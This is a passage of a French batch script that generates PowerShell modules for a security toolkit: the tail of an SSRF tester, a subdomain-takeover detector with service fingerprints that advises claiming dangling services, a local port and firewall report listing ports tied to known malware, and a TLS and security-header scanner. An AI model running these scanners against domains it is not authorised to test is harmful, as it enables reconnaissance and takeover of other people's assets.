echo            Write-Host "[~] Reponse 200 rapide (${elapsed}ms) - A verifier manuellement" -f Yellow >> "%SSRF_PS%"
echo            $suspicious++ >> "%SSRF_PS%"
echo        } else { >> "%SSRF_PS%"
echo            Write-Host "[-] HTTP $($r.StatusCode) (${elapsed}ms)" -f DarkGray >> "%SSRF_PS%"
echo        } >> "%SSRF_PS%"
echo    } catch [System.Net.WebException] { >> "%SSRF_PS%"
echo        $elapsed = [math]::Round(((Get-Date)-$start).TotalMilliseconds) >> "%SSRF_PS%"
echo        $sc = $_.Exception.Response.StatusCode.value__ >> "%SSRF_PS%"
echo        if ($sc) { >> "%SSRF_PS%"
echo            Write-Host "[-] HTTP $sc (${elapsed}ms)" -f DarkGray >> "%SSRF_PS%"
echo        } elseif ($elapsed -ge 5800) { >> "%SSRF_PS%"
echo            Write-Host "[~] TIMEOUT (${elapsed}ms) - Port potentiellement ouvert" -f Yellow >> "%SSRF_PS%"
echo            $suspicious++ >> "%SSRF_PS%"
echo        } else { >> "%SSRF_PS%"
echo            Write-Host "[-] Erreur reseau (${elapsed}ms)" -f DarkGray >> "%SSRF_PS%"
echo        } >> "%SSRF_PS%"
echo    } catch { >> "%SSRF_PS%"
echo        $elapsed = [math]::Round(((Get-Date)-$start).TotalMilliseconds) >> "%SSRF_PS%"
echo        Write-Host "[-] Bloque (${elapsed}ms)" -f DarkGray >> "%SSRF_PS%"
echo    } >> "%SSRF_PS%"
echo } >> "%SSRF_PS%"
echo. >> "%SSRF_PS%"
echo Write-Host "" >> "%SSRF_PS%"
echo Write-Host "  ================================================" -f Cyan >> "%SSRF_PS%"
echo if ($vulns -gt 0) { >> "%SSRF_PS%"
echo    Write-Host "  [!!!] $vulns SSRF confirme(s) !" -f Red >> "%SSRF_PS%"
echo    Write-Host "  Impact possible :" -f Red >> "%SSRF_PS%"
echo    Write-Host "    - Lecture des metadonnees cloud (cles IAM AWS, tokens GCP/Azure)" -f Yellow >> "%SSRF_PS%"
echo    Write-Host "    - Acces aux services internes (Redis, MongoDB, Elasticsearch)" -f Yellow >> "%SSRF_PS%"
echo    Write-Host "    - Lectre de fichiers systeme via file://" -f Yellow >> "%SSRF_PS%"
echo    Write-Host "    - Pivoting vers le reseau interne du serveur" -f Yellow >> "%SSRF_PS%"
echo    Write-Host "" >> "%SSRF_PS%"
echo    Write-Host "  [!] DANGER CRITIQUE : L'attaquant utilise votre serveur comme un rebond" -f Red >> "%SSRF_PS%"
echo    Write-Host "  pour attaquer votre infrastructure interne (Azure, AWS, DB)." -f Red >> "%SSRF_PS%"
echo } elseif ($suspicious -gt 0) { >> "%SSRF_PS%"
echo    Write-Host "  [~] $suspicious reponse(s) suspecte(s) - Verifiez manuellement" -f Yellow >> "%SSRF_PS%"
echo    Write-Host "  Testez avec Burp Suite ou curl pour confirmer." -f DarkGray >> "%SSRF_PS%"
echo } else { >> "%SSRF_PS%"
echo    Write-Host "  [OK] Aucun SSRF detecte sur les payloads testes." -f Green >> "%SSRF_PS%"
echo    Write-Host "  Note : Un WAF peut bloquer les requetes - testez avec d'autres" -f DarkGray >> "%SSRF_PS%"
echo    Write-Host "  encodages (double URL, IPv6, decimal, octal...)" -f DarkGray >> "%SSRF_PS%"
echo } >> "%SSRF_PS%"
echo Write-Host "  ================================================" -f Cyan >> "%SSRF_PS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%SSRF_PS%"
if exist "%SSRF_PS%" del "%SSRF_PS%"
echo.
pause
goto net_cyber_menu

:cyber_subdomain_takeover
cls
echo.
echo  ===========================================================
echo   SUBDOMAIN TAKEOVER - Detection
echo  ===========================================================
echo   Verifie si des sous-domaines pointent vers
echo   des services externes abandonnes.
echo  ===========================================================
echo.
set /p "TKO_DOM=Domaine racine cible (ex: monsite.com) : "
if "%TKO_DOM%"=="" goto net_cyber_menu

set "TKO_PS=%TEMP%\takeover.ps1"
if exist "%TKO_PS%" del "%TKO_PS%"

echo $domain = "!TKO_DOM!" > "%TKO_PS%"
echo $ua = "Mozilla/5.0" >> "%TKO_PS%"
echo $vulns = 0 >> "%TKO_PS%"
echo $dangling = 0 >> "%TKO_PS%"
echo. >> "%TKO_PS%"
echo $fingerprints = @( >> "%TKO_PS%"
echo    @{ Service='GitHub Pages';        CNAME=@('github.io','github.com');         Error='There isn''t a GitHub Pages site here|For root URLs|Did you mean to visit' }, >> "%TKO_PS%"
echo    @{ Service='Heroku';              CNAME=@('herokuapp.com','herokudns.com');   Error='No such app|heroku\s*\|no-such-app' }, >> "%TKO_PS%"
echo    @{ Service='Netlify';             CNAME=@('netlify.app','netlify.com');       Error='Not Found - Request ID|page not found|netlify.*not found' }, >> "%TKO_PS%"
echo    @{ Service='AWS S3';              CNAME=@('s3.amazonaws.com','s3-website');   Error='NoSuchBucket|The specified bucket does not exist' }, >> "%TKO_PS%"
echo    @{ Service='AWS Elastic Beanstalk'; CNAME=@('elasticbeanstalk.com');          Error='404.*EB|No Application Found|no such application' }, >> "%TKO_PS%"
echo    @{ Service='Azure Blob Storage';  CNAME=@('blob.core.windows.net');           Error='The specified container does not exist|BlobNotFound|ResourceNotFound' }, >> "%TKO_PS%"
echo    @{ Service='Azure CDN';           CNAME=@('azureedge.net','azure.com');       Error='The resource you are looking for has been removed' }, >> "%TKO_PS%"
echo    @{ Service='Fastly';              CNAME=@('fastly.net');                      Error='Fastly error: unknown domain|Please check that this domain has been added' }, >> "%TKO_PS%"
echo    @{ Service='Shopify';             CNAME=@('myshopify.com','shopify.com');     Error='Sorry, this shop is currently unavailable|only accessible to|shop is unavailable' }, >> "%TKO_PS%"
echo    @{ Service='Ghost (Pro)';         CNAME=@('ghost.io','ghostchefs.com');       Error='The thing you were looking for is no longer here|404.*ghost' }, >> "%TKO_PS%"
echo    @{ Service='HubSpot';             CNAME=@('hubspot.net','hubspotpagebuilder'); Error='Domain not configured|does not exist in our system|hs-sites' }, >> "%TKO_PS%"
echo    @{ Service='Zendesk';             CNAME=@('zendesk.com','zendeskservice');    Error='Help Center Closed|Oops! This help center no longer exists' }, >> "%TKO_PS%"
echo    @{ Service='Cargo Collective';    CNAME=@('cargocollective.com');             Error='If you''re moving your domain away from Cargo|404 Not Found.*cargo' }, >> "%TKO_PS%"
echo    @{ Service='Tumblr';              CNAME=@('tumblr.com');                      Error='Whatever you were looking for doesn''t currently exist|There''s nothing here' }, >> "%TKO_PS%"
echo    @{ Service='Squarespace';         CNAME=@('squarespace.com','sqsp.net');      Error='No Such Account|this domain is not connected to a Squarespace site' }, >> "%TKO_PS%"
echo    @{ Service='Pantheon';            CNAME=@('pantheonsite.io','pantheon.io');   Error='404 error: unknown site|The gods are wise|pantheon.io' }, >> "%TKO_PS%"
echo    @{ Service='Vercel';              CNAME=@('vercel.app','now.sh');             Error='The deployment could not be found|This deployment has been disabled|DEPLOYMENT_NOT_FOUND' }, >> "%TKO_PS%"
echo    @{ Service='Surge.sh';            CNAME=@('surge.sh');                        Error='project not found|surge - 404' }, >> "%TKO_PS%"
echo    @{ Service='Webflow';             CNAME=@('webflow.io','proxy.webflow.com'); Error='The page you are looking for doesn''t exist|page has moved|webflow.*404' } >> "%TKO_PS%"
echo ) >> "%TKO_PS%"
echo. >> "%TKO_PS%"
echo $subs = @( >> "%TKO_PS%"
echo    'www','api','dev','test','staging','beta','alpha','uat','qa','demo', >> "%TKO_PS%"
echo    'old','legacy','v1','v2','v3','preview','sandbox','pre','preprod', >> "%TKO_PS%"
echo    'admin','portal','dashboard','panel','manage','control', >> "%TKO_PS%"
echo    'blog','news','shop','store','docs','wiki','help','support','kb', >> "%TKO_PS%"
echo    'static','assets','cdn','media','files','downloads','img','images', >> "%TKO_PS%"
echo    'mail','email','smtp','webmail','newsletter','m','mobile','app', >> "%TKO_PS%"
echo    'status','monitor','health','metrics','analytics','track', >> "%TKO_PS%"
echo    'git','repo','jenkins','ci','cd','build','deploy','devops', >> "%TKO_PS%"
echo    'jobs','careers','about','contact','feedback','community' >> "%TKO_PS%"
echo ) >> "%TKO_PS%"
echo. >> "%TKO_PS%"
echo Write-Host "" >> "%TKO_PS%"
echo Write-Host "  Scan de $($subs.Count) sous-domaines pour $domain..." -f Cyan >> "%TKO_PS%"
echo Write-Host "  Detection de 19 services (GitHub, S3, Heroku, Vercel...)" -f DarkGray >> "%TKO_PS%"
echo Write-Host "" >> "%TKO_PS%"
echo. >> "%TKO_PS%"
echo foreach ($sub in $subs) { >> "%TKO_PS%"
echo    $fqdn = "$sub.$domain" >> "%TKO_PS%"
echo    try { >> "%TKO_PS%"
echo        $dnsResult = Resolve-DnsName $fqdn -ErrorAction Stop >> "%TKO_PS%"
echo        $cnames = $dnsResult | Where-Object { $_.Type -eq 'CNAME' } | Select-Object -ExpandProperty NameHost >> "%TKO_PS%"
echo        $ips    = $dnsResult | Where-Object { $_.Type -eq 'A' }     | Select-Object -ExpandProperty IPAddress >> "%TKO_PS%"
echo        if (-not $cnames) { continue } >> "%TKO_PS%"
echo        $cnameStr = ($cnames -join ', ') >> "%TKO_PS%"
echo        $matched = $false >> "%TKO_PS%"
echo        foreach ($fp in $fingerprints) { >> "%TKO_PS%"
echo            $hit = $false >> "%TKO_PS%"
echo            foreach ($c in $cnames) { >> "%TKO_PS%"
echo                foreach ($pattern in $fp.CNAME) { >> "%TKO_PS%"
echo                    if ($c -match [regex]::Escape($pattern)) { $hit = $true; break } >> "%TKO_PS%"
echo                } >> "%TKO_PS%"
echo                if ($hit) { break } >> "%TKO_PS%"
echo            } >> "%TKO_PS%"
echo            if (-not $hit) { continue } >> "%TKO_PS%"
echo            $matched = $true >> "%TKO_PS%"
echo            Write-Host "  [CNAME] $fqdn" -f White -NoNewline >> "%TKO_PS%"
echo            Write-Host " -> $cnameStr" -f Gray >> "%TKO_PS%"
echo            Write-Host "         Service detecte : $($fp.Service)" -f Cyan >> "%TKO_PS%"
echo            $confirmed = $false >> "%TKO_PS%"
echo            foreach ($scheme in @('https','http')) { >> "%TKO_PS%"
echo                try { >> "%TKO_PS%"
echo                    $r = Invoke-WebRequest "$scheme`://$fqdn" -UserAgent $ua -TimeoutSec 8 -UseBasicParsing -EA Stop -MaximumRedirection 3 >> "%TKO_PS%"
echo                    if ($r.Content -match $fp.Error) { >> "%TKO_PS%"
echo                        Write-Host "         [!!!] TAKEOVER CONFIRME !" -f Red >> "%TKO_PS%"
echo                        Write-Host "               Fingerprint trouve dans la reponse HTTP" -f Red >> "%TKO_PS%"
echo                        Write-Host "               Action : Reclamez le service '$($fp.Service)'" -f Yellow >> "%TKO_PS%"
echo                        Write-Host "               CNAME dangling : $cnameStr" -f Yellow >> "%TKO_PS%"
echo                        $vulns++; $confirmed = $true; break >> "%TKO_PS%"
echo                    } else { >> "%TKO_PS%"
echo                        Write-Host "         [-] CNAME pointe vers $($fp.Service) mais le service repond (actif)" -f DarkGray >> "%TKO_PS%"
echo                        $confirmed = $true; break >> "%TKO_PS%"
echo                    } >> "%TKO_PS%"
echo                } catch { } >> "%TKO_PS%"
echo            } >> "%TKO_PS%"
echo            if (-not $confirmed) { >> "%TKO_PS%"
echo                Write-Host "         [~] CNAME dangling - Service ne repond pas (potentiellement vulnerable)" -f Yellow >> "%TKO_PS%"
echo                $dangling++ >> "%TKO_PS%"
echo            } >> "%TKO_PS%"
echo            break >> "%TKO_PS%"
echo        } >> "%TKO_PS%"
echo        if (-not $matched) { >> "%TKO_PS%"
echo            Write-Host "  [INFO] $fqdn -> CNAME: $cnameStr (service inconnu)" -f DarkGray >> "%TKO_PS%"
echo        } >> "%TKO_PS%"
echo    } catch { } >> "%TKO_PS%"
echo } >> "%TKO_PS%"
echo. >> "%TKO_PS%"
echo Write-Host "" >> "%TKO_PS%"
echo Write-Host "  ================================================" -f Cyan >> "%TKO_PS%"
echo if ($vulns -gt 0) { >> "%TKO_PS%"
echo    Write-Host "  [!!!] $vulns takeover(s) CONFIRME(S) !" -f Red >> "%TKO_PS%"
echo    Write-Host "  Un attaquant peut servir du contenu sous votre domaine." -f Red >> "%TKO_PS%"
echo    Write-Host "  Correction : Supprimez les enregistrements CNAME dangling" -f Yellow >> "%TKO_PS%"
echo    Write-Host "  dans votre gestionnaire DNS." -f Yellow >> "%TKO_PS%"
echo } elseif ($dangling -gt 0) { >> "%TKO_PS%"
echo    Write-Host "  [~] $dangling CNAME(s) dangling detecte(s) - Service ne repond pas." -f Yellow >> "%TKO_PS%"
echo    Write-Host "  Verifiez si ces services sont encore actifs." -f DarkGray >> "%TKO_PS%"
echo } else { >> "%TKO_PS%"
echo    Write-Host "  [OK] Aucun subdomain takeover detecte." -f Green >> "%TKO_PS%"
echo } >> "%TKO_PS%"
echo Write-Host "  ================================================" -f Cyan >> "%TKO_PS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%TKO_PS%"
if exist "%TKO_PS%" del "%TKO_PS%"
echo.
pause
goto net_cyber_menu

:cyber_security_report
cls
echo.
echo  ================================================
echo   RAPPORT DE SECURITE RESEAU COMPLET
echo  ================================================
echo   Effectue un audit global du PC : ports,
echo   processus, firewall et alertes DNS.
echo.
echo  [i] Appuyez sur ECHAP pour annuler la generation.
echo.
echo  Initialisation de l'audit...
set "RPS=%TEMP%\cyber_report.ps1"
if exist "%RPS%" del "%RPS%"

echo Write-Host "  [1/7] Initialisation du fichier..." -f Cyan >> "%RPS%"
echo $f = [System.Environment]::GetFolderPath('Desktop') + '\RapportSecuriteReseau_' + (Get-Date -Format 'yyyyMMdd_HHmm') + '.html' >> "%RPS%"
echo $css = 'body{font-family:Segoe UI,sans-serif;background:#0d1117;color:#e6edf3;padding:20px}h1{color:#f85149;border-bottom:2px solid #f85149;padding-bottom:8px}h2{color:#ff7b72;background:#161b22;padding:8px;border-radius:4px;margin-top:20px}table{width:100%%;border-collapse:collapse;margin:8px 0}th{background:#f85149;color:white;padding:6px;text-align:left}td{padding:5px 8px;border-bottom:1px solid #21262d}tr:hover{background:#1c2128}.ok{color:#3fb950}.danger{color:#f85149}' >> "%RPS%"
echo if ($Host.UI.RawUI.KeyAvailable) { $k = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown'); if ($k.VirtualKeyCode -eq 27) { exit } } >> "%RPS%"

echo Write-Host "  [2/7] Analyse des ports TCP en ecoute..." -f Yellow >> "%RPS%"
echo $pt = Get-NetTCPConnection -State Listen -EA SilentlyContinue ^| Sort-Object LocalPort ^| ForEach-Object { $p=(Get-Process -Id $_.OwningProcess -EA SilentlyContinue).Name; "<tr><td>TCP</td><td>$($_.LocalPort)</td><td>$p</td><td>$($_.OwningProcess)</td></tr>" } >> "%RPS%"

echo Write-Host "  [3/7] Analyse des points de terminaison UDP..." -f Yellow >> "%RPS%"
echo $pu = Get-NetUDPEndpoint -EA SilentlyContinue ^| Sort-Object LocalPort ^| Select-Object -First 30 ^| ForEach-Object { $p=(Get-Process -Id $_.OwningProcess -EA SilentlyContinue).Name; "<tr><td>UDP</td><td>$($_.LocalPort)</td><td>$p</td><td>$($_.OwningProcess)</td></tr>" } >> "%RPS%"

echo Write-Host "  [4/7] Cartographie des connexions actives..." -f Yellow >> "%RPS%"
echo $co = Get-NetTCPConnection -State Established -EA SilentlyContinue ^| ForEach-Object { $p=(Get-Process -Id $_.OwningProcess -EA SilentlyContinue).Name; "<tr><td>$p</td><td>$($_.LocalPort)</td><td>$($_.RemoteAddress)</td><td>$($_.RemotePort)</td></tr>" } >> "%RPS%"

echo Write-Host "  [5/7] Audit des profils du Pare-feu..." -f Yellow >> "%RPS%"
echo $fw = Get-NetFirewallProfile ^| ForEach-Object { $s=if($_.Enabled -eq 'True'){'ok'}else{'danger'};$st=if($_.Enabled -eq 'True'){'ACTIF'}else{'INACTIF'}; "<tr><td>$($_.Name)</td><td class='$s'>$st</td><td>$($_.DefaultInboundAction)</td><td>$($_.DefaultOutboundAction)</td></tr>" } >> "%RPS%"

echo Write-Host "  [6/7] Verification de securite (Ports Suspects/DNS)..." -f Yellow >> "%RPS%"
echo $sp = @{1337='DarkComet';4444='Metasploit';5900='VNC';6666='IRC/Bot';31337='BackOrifice';12345='NetBus';3389='RDP';23='Telnet';21='FTP';8080='Proxy'} >> "%RPS%"
echo $op = Get-NetTCPConnection -State Listen -EA SilentlyContinue ^| Select-Object -ExpandProperty LocalPort >> "%RPS%"
echo $al = ($sp.Keys ^| Where-Object { $op -contains $_ } ^| ForEach-Object { "<tr><td class='danger'>ALERTE</td><td>$_</td><td>$($sp[$_])</td></tr>" }) -join '' >> "%RPS%"
echo if (-not $al) { $al = "<tr><td class='ok' colspan='3'>Aucun port suspect detecte</td></tr>" } >> "%RPS%"
echo $dn = Get-DnsClientServerAddress ^| Where-Object { $_.ServerAddresses } ^| ForEach-Object { "<tr><td>$($_.InterfaceAlias)</td><td>$($_.ServerAddresses -join ', ')</td></tr>" } >> "%RPS%"

echo Write-Host "  [7/7] Generation du rapport final..." -f Green >> "%RPS%"
echo $html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><title>Securite Reseau</title><style>$css</style></head><body><h1>Rapport Securite Reseau - $env:COMPUTERNAME</h1><p>Genere le $(Get-Date -Format 'dd/MM/yyyy HH:mm')</p><h2>Alertes Ports Suspects</h2><table><tr><th>Niveau</th><th>Port</th><th>Menace</th></tr>$al</table><h2>Ports en Ecoute</h2><table><tr><th>Proto</th><th>Port</th><th>Processus</th><th>PID</th></tr>$(($pt+$pu) -join '')</table><h2>Connexions Actives</h2><table><tr><th>Processus</th><th>Port Local</th><th>IP Distante</th><th>Port Distant</th></tr>$(($co) -join '')</table><h2>Pare-feu</h2><table><tr><th>Profil</th><th>Statut</th><th>Entrant</th><th>Sortant</th></tr>$(($fw) -join '')</table><h2>DNS</h2><table><tr><th>Interface</th><th>Serveurs</th></tr>$(($dn) -join '')</table></body></html>" >> "%RPS%"
echo $html ^| Out-File $f -Encoding UTF8 >> "%RPS%"
echo Start-Process $f >> "%RPS%"

powershell -NoProfile -ExecutionPolicy Bypass -File "%RPS%"
if exist "%RPS%" del "%RPS%"
echo.
echo  [OK] Rapport genere sur le Bureau.
pause
goto net_cyber_menu

REM ===================================================================
REM         SCAN TLS / SSL AVANCE (Protocoles et Ciphers faibles)
REM ===================================================================
:cyber_tls_scan
cls
echo.
echo  ===========================================================
echo   SCAN TLS/SSL AVANCE - Detection protocoles faibles
echo  ===========================================================
echo   Analyse la version TLS et la solidite du
echo   certificat pour prevenir les interceptions.
echo  ===========================================================
echo.
echo  Entrez l'hote cible (ex: monsite.com ou IP)
set "ALEEX_TLS_HOST="
set /p "ALEEX_TLS_HOST=Hote : "
if not defined ALEEX_TLS_HOST goto net_cyber_menu

echo  Port (defaut 443, Entree pour valider)
set "ALEEX_TLS_PORT="
set /p "ALEEX_TLS_PORT=Port : "
if not defined ALEEX_TLS_PORT set "ALEEX_TLS_PORT=443"

set "TLS_PS=%TEMP%\tls_scan_%RANDOM%.ps1"
if exist "%TLS_PS%" del /f /q "%TLS_PS%"

echo $host_target = $env:ALEEX_TLS_HOST >> "%TLS_PS%"
echo $port = [int]$env:ALEEX_TLS_PORT >> "%TLS_PS%"
echo $timeout = 5000 >> "%TLS_PS%"
echo $findings = @() >> "%TLS_PS%"
echo $score = 100 >> "%TLS_PS%"
echo. >> "%TLS_PS%"
echo function Add-TlsFinding($sev, $msg, $pts) { >> "%TLS_PS%"
echo    $script:score -= $pts >> "%TLS_PS%"
echo    $script:findings += [PSCustomObject]@{ Severite=$sev; Message=$msg } >> "%TLS_PS%"
echo    $c = switch($sev){ 'CRITIQUE' {'Red'}; 'ELEVE' {'DarkYellow'}; 'MOYEN' {'Yellow'}; default {'Cyan'} } >> "%TLS_PS%"
echo    Write-Host "  [$sev] $msg" -f $c >> "%TLS_PS%"
echo } >> "%TLS_PS%"
echo. >> "%TLS_PS%"
echo Write-Host "" >> "%TLS_PS%"
echo Write-Host "  Cible : ${host_target}:${port}" -f Cyan >> "%TLS_PS%"
echo Write-Host "" >> "%TLS_PS%"
echo. >> "%TLS_PS%"
echo $protocols = @( >> "%TLS_PS%"
echo    [PSCustomObject]@{ Name='SSLv3';   Enum=[System.Security.Authentication.SslProtocols]::Ssl3;   Sev='CRITIQUE'; Pts=40 }, >> "%TLS_PS%"
echo    [PSCustomObject]@{ Name='TLS 1.0'; Enum=[System.Security.Authentication.SslProtocols]::Tls;    Sev='ELEVE';   Pts=25 }, >> "%TLS_PS%"
echo    [PSCustomObject]@{ Name='TLS 1.1'; Enum=[System.Security.Authentication.SslProtocols]::Tls11;  Sev='MOYEN';   Pts=10 }, >> "%TLS_PS%"
echo    [PSCustomObject]@{ Name='TLS 1.2'; Enum=[System.Security.Authentication.SslProtocols]::Tls12;  Sev='OK';      Pts=0  }, >> "%TLS_PS%"
echo ) >> "%TLS_PS%"
echo. >> "%TLS_PS%"
echo Write-Host "  [1/4] Test des versions de protocoles..." -f Blue >> "%TLS_PS%"
echo foreach ($proto in $protocols) { >> "%TLS_PS%"
echo    try { >> "%TLS_PS%"
echo        $tcp = New-Object System.Net.Sockets.TcpClient >> "%TLS_PS%"
echo        $conn = $tcp.BeginConnect($host_target, $port, $null, $null) >> "%TLS_PS%"
echo        if (-not $conn.AsyncWaitHandle.WaitOne($timeout, $false)) { throw "Timeout" } >> "%TLS_PS%"
echo        $tcp.EndConnect($conn) >> "%TLS_PS%"
echo        $stream = $tcp.GetStream() >> "%TLS_PS%"
echo        $ssl = New-Object System.Net.Security.SslStream($stream, $false, { $true }) >> "%TLS_PS%"
echo        $ssl.AuthenticateAsClient($host_target, $null, $proto.Enum, $false) >> "%TLS_PS%"
echo        if ($proto.Sev -eq 'OK') { >> "%TLS_PS%"
echo            Write-Host "  [OK] $($proto.Name) supporte (bon)" -f Green >> "%TLS_PS%"
echo        } else { >> "%TLS_PS%"
echo            Add-TlsFinding $proto.Sev "$($proto.Name) accepte par le serveur !" $proto.Pts >> "%TLS_PS%"
echo        } >> "%TLS_PS%"
echo        $ssl.Close(); $tcp.Close() >> "%TLS_PS%"
echo    } catch { >> "%TLS_PS%"
echo        if ($proto.Sev -ne 'OK') { >> "%TLS_PS%"
echo            Write-Host "  [OK] $($proto.Name) refuse (securise)" -f Green >> "%TLS_PS%"
echo        } else { >> "%TLS_PS%"
echo            Write-Host "  [--] $($proto.Name) non supporte" -f DarkGray >> "%TLS_PS%"
echo        } >> "%TLS_PS%"
echo    } >> "%TLS_PS%"
echo } >> "%TLS_PS%"
echo. >> "%TLS_PS%"
echo Write-Host "" >> "%TLS_PS%"
echo Write-Host "  [2/4] Analyse du certificat..." -f Blue >> "%TLS_PS%"
echo try { >> "%TLS_PS%"
echo    $req = [Net.HttpWebRequest]::Create("https://${host_target}:${port}/") >> "%TLS_PS%"
echo    $req.Timeout = $timeout >> "%TLS_PS%"
echo    $req.ServerCertificateValidationCallback = { param($s,$c,$ch,$e); $script:cert=$c; return $true } >> "%TLS_PS%"
echo    try { $null = $req.GetResponse() } catch {} >> "%TLS_PS%"
echo    if ($script:cert) { >> "%TLS_PS%"
echo        $exp  = [DateTime]::Parse($script:cert.GetExpirationDateString()) >> "%TLS_PS%"
echo        $iss  = $script:cert.Issuer >> "%TLS_PS%"
echo        $sub  = $script:cert.Subject >> "%TLS_PS%"
echo        $days = ([int]($exp - (Get-Date)).TotalDays) >> "%TLS_PS%"
echo        Write-Host "  Sujet   : $sub" -f Gray >> "%TLS_PS%"
echo        Write-Host "  Emetteur: $iss" -f Gray >> "%TLS_PS%"
echo        Write-Host "  Expir.  : $($exp.ToString('dd/MM/yyyy')) ($days jours restants)" -f $(if($days -lt 0){'Red'}elseif($days -lt 30){'Yellow'}else{'Green'}) >> "%TLS_PS%"
echo        if ($days -lt 0)  { Add-TlsFinding 'CRITIQUE' "Certificat EXPIRE depuis $([math]::Abs($days)) jours !" 50 } >> "%TLS_PS%"
echo        elseif ($days -lt 15) { Add-TlsFinding 'CRITIQUE' "Certificat expire dans $days jours !" 30 } >> "%TLS_PS%"
echo        elseif ($days -lt 30) { Add-TlsFinding 'ELEVE'    "Certificat expire bientot ($days jours)" 15 } >> "%TLS_PS%"
echo        if ($sub -notmatch [regex]::Escape($host_target)) { >> "%TLS_PS%"
echo            Add-TlsFinding 'ELEVE' "Nom de domaine ne correspond pas au certificat (possible MITM)" 20 >> "%TLS_PS%"
echo        } >> "%TLS_PS%"
echo    } >> "%TLS_PS%"
echo } catch { Write-Host "  [!] Impossible d'analyser le certificat." -f DarkGray } >> "%TLS_PS%"
echo. >> "%TLS_PS%"
echo Write-Host "" >> "%TLS_PS%"
echo Write-Host "  [3/4] Verification des headers de securite TLS..." -f Blue >> "%TLS_PS%"
echo try { >> "%TLS_PS%"
echo    $r = Invoke-WebRequest "https://${host_target}:${port}/" -TimeoutSec 8 -UseBasicParsing -EA Stop >> "%TLS_PS%"
echo    $h = $r.Headers >> "%TLS_PS%"
echo    if (-not $h['Strict-Transport-Security']) { Add-TlsFinding 'ELEVE'   'HSTS manquant - downgrade HTTP possible' 20 } >> "%TLS_PS%"
echo    else { >> "%TLS_PS%"
echo        $hsts = $h['Strict-Transport-Security'] >> "%TLS_PS%"
echo        Write-Host "  [OK] HSTS present : $hsts" -f Green >> "%TLS_PS%"
echo        if ($hsts -notmatch 'includeSubDomains') { Add-TlsFinding 'MOYEN' 'HSTS sans includeSubDomains' 5 } >> "%TLS_PS%"
echo        if ($hsts -notmatch 'preload')           { Add-TlsFinding 'INFO'  'HSTS sans preload' 0 } >> "%TLS_PS%"
echo    } >> "%TLS_PS%"
echo    if (-not $h['Content-Security-Policy']) { Add-TlsFinding 'MOYEN' 'CSP manquant' 10 } >> "%TLS_PS%"
echo    if ($h['X-Powered-By'])  { Add-TlsFinding 'INFO' "Techno exposee : $($h['X-Powered-By'])" 0 } >> "%TLS_PS%"
echo    if ($h['Server'])        { Add-TlsFinding 'INFO' "Serveur expose : $($h['Server'])" 0 } >> "%TLS_PS%"
echo } catch { Write-Host "  [!] HTTPS inaccessible sur ce port." -f DarkGray } >> "%TLS_PS%"
echo. >> "%TLS_PS%"
echo Write-Host "" >> "%TLS_PS%"
echo Write-Host "  [4/4] Test redirection HTTP vers HTTPS..." -f Blue >> "%TLS_PS%"
echo try { >> "%TLS_PS%"
echo    $redir = Invoke-WebRequest "http://${host_target}/" -MaximumRedirection 0 -TimeoutSec 5 -UseBasicParsing -EA Stop >> "%TLS_PS%"
echo    Add-TlsFinding 'ELEVE' "HTTP ne redirige pas vers HTTPS (code $($redir.StatusCode))" 20 >> "%TLS_PS%"
echo } catch { >> "%TLS_PS%"
echo    $loc = $_.Exception.Response.Headers['Location'] >> "%TLS_PS%"
echo    if ($loc -like 'https://*') { Write-Host "  [OK] Redirection HTTP -> HTTPS presente" -f Green } >> "%TLS_PS%"
echo    else { Add-TlsFinding 'MOYEN' 'Redirection HTTP vers HTTPS absente ou incorrecte' 10 } >> "%TLS_PS%"
echo } >> "%TLS_PS%"
echo. >> "%TLS_PS%"
echo Write-Host "" >> "%TLS_PS%"
echo Write-Host "  ================================================" -f Cyan >> "%TLS_PS%"
echo $grade = if($script:score -ge 90){'A+'}elseif($script:score -ge 75){'B'}elseif($script:score -ge 50){'C'}elseif($script:score -ge 25){'D'}else{'F'} >> "%TLS_PS%"
echo $gc    = if($script:score -ge 75){'Green'}elseif($script:score -ge 50){'Yellow'}else{'Red'} >> "%TLS_PS%"
echo Write-Host "  Score TLS : $script:score/100  Grade : $grade" -f $gc >> "%TLS_PS%"
echo if ($script:findings.Count -eq 0) { Write-Host "  [OK] Aucun probleme TLS detecte !" -f Green } >> "%TLS_PS%"
echo Write-Host "" >> "%TLS_PS%"
echo Write-Host "  [!] RISQUES TLS :" -f Red >> "%TLS_PS%"
echo Write-Host "  1. Interception : Des protocoles faibles (SSLv3) permettent le MITM." -f Yellow >> "%TLS_PS%"
echo Write-Host "  2. Phishing : Un certificat expire ou mal nomme detruit la confiance." -f Yellow >> "%TLS_PS%"
echo Write-Host "  3. Downgrade : L'absence de HSTS permet de forcer le passage en HTTP." -f Yellow >> "%TLS_PS%"
echo Write-Host "  ================================================" -f Cyan >> "%TLS_PS%"
echo. >> "%TLS_PS%"
echo $sel = 1 >> "%TLS_PS%"
echo function Show-Choice { >> "%TLS_PS%"
echo     param($s) >> "%TLS_PS%"
echo     $c = $host.UI.RawUI.CursorPosition; $c.X = 0; $host.UI.RawUI.CursorPosition = $c >> "%TLS_PS%"
echo     Write-Host "  Exporter les resultats en JSON ?  " -NoNewline >> "%TLS_PS%"
echo     if ($s -eq 0) { Write-Host " OUI " -NoNewline -ForegroundColor Black -BackgroundColor Green; Write-Host "   NON  " -ForegroundColor DarkGray } >> "%TLS_PS%"
echo     else          { Write-Host " OUI " -NoNewline -ForegroundColor DarkGray;                    Write-Host "   NON  " -ForegroundColor Black -BackgroundColor Red } >> "%TLS_PS%"
echo } >> "%TLS_PS%"
echo Write-Host "" >> "%TLS_PS%"
echo Show-Choice $sel >> "%TLS_PS%"
echo while ($true) { >> "%TLS_PS%"
echo     $k = [Console]::ReadKey($true) >> "%TLS_PS%"
echo     if ($k.Key -eq 'LeftArrow' -or $k.Key -eq 'RightArrow') { >> "%TLS_PS%"
echo         $sel = 1 - $sel >> "%TLS_PS%"
echo         $c = $host.UI.RawUI.CursorPosition; $c.Y--; $host.UI.RawUI.CursorPosition = $c >> "%TLS_PS%"
echo         Show-Choice $sel >> "%TLS_PS%"
echo     } elseif ($k.Key -eq 'Enter') { break } >> "%TLS_PS%"
echo     elseif ($k.Key -eq 'Escape') { $sel = 1; break } >> "%TLS_PS%"
echo } >> "%TLS_PS%"
echo Write-Host "" >> "%TLS_PS%"
echo if ($sel -eq 0) { >> "%TLS_PS%"
echo    $out = [PSCustomObject]@{ >> "%TLS_PS%"
